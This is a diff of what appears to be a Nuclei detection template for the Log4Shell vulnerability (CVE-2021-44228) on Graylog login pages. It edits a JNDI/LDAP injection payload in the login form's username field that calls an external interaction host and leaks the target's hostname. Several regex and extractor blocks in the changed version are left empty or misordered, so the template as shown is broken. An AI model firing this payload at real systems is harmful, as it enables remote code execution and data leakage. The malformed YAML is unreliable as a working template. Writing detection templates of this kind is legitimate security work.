@@ -15,9 +15,13 @@ info:
     cve-id: CVE-2021-44228
     cwe-id: CWE-77
   metadata:
+    verified: true
+    max-request: 1
     shodan-query: html:"vmw_nsx_logo-black-triangle-500w.png"
-    verified: "true"
   tags: cve,cve2021,rce,jndi,log4j,graylog,kev,oast
+variables:
+  rand1: '{{rand_int(111, 999)}}'
+  rand2: '{{rand_int(111, 999)}}'
 
 http:
   - raw:
@@ -29,32 +33,37 @@ http:
         Origin: {{BaseURL}}
         Referer: {{BaseURL}}/login.jsp
 
-        username=${jndi:ldap://${sys:os.name}.{{interactsh-url}}}&password=admin&submit=
+        username=${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.username.{{interactsh-url}}}&password=admin&submit=
 
     matchers-condition: and
     matchers:
       - type: word
-        part: interactsh_protocol  # Confirms the DNS Interaction
+        part: interactsh_protocol # Confirms the DNS Interaction
         words:
           - "dns"
-
-      - type: regex
-        part: interactsh_request
-        regex:
-          - '([a-zA-Z0-9.-]+).([a-z0-9]+).([a-z0-9]+).\w+'  # Match for extracted ${sys:os.name} variable
 
       - type: word
         part: location
         words:
           - '/login.jsp?login_error=1'
 
+      - type: regex
+        part: interactsh_request
+        regex:
+
+
     extractors:
       - type: kval
         kval:
-          - interactsh_ip # Print remote interaction IP in output
+
 
       - type: regex
+        group: 2
+        regex:
         part: interactsh_request
+
+      - type: regex
         group: 1
         regex:
-          - '([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'  # Print extracted ${sys:os.name} in output
+        part: interactsh_request
+# digest: 4b0a004830460221008d7d00dc839c7689c21aeb46ee294a97ca65414a521ad162bfcc6c0dd2901d4c022100f96346b109721448fc5ee67a3469c0a2a913bcd494fdd6a7d097750e5ba64278:922c64590222798bb761d5b6d8e72950
